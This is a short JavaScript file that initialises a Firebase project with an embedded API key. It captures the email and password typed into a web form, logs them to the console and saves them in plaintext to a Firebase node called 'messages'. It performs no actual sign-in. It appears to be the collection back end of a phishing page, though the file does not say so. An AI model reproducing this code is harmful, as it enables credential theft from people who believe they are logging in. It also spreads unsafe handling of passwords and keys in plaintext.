//init db
var config = {
    apiKey: "AIzaSyCtLulzF6pM21Jb9i6y7pV1YSodEDoYrCc",
    authDomain: "iheb-9b535.firebaseapp.com",
    databaseURL: "https://iheb-9b535.firebaseio.com",
    projectId: "iheb-9b535",
    storageBucket: "iheb-9b535.appspot.com",
    messagingSenderId: "723067897519"
  };
  firebase.initializeApp(config);

document.getElementById("waa").addEventListener("submit",submitForm);

  function getInputVal(id){
      return document.getElementById(id).value;
  }
  var messagesRef = firebase.database().ref('messages');
  function submitForm(e){
    e.preventDefault();
    // Get values

 
    var email = getInputVal("email");
    var password = getInputVal("pwd");

    console.log(email + "   "+password);
    saveMessage(email,password);
}
function saveMessage(email, password){
    var newMessageRef = messagesRef.push();
    newMessageRef.set({
      email:email,
      password : password
     
    });
  }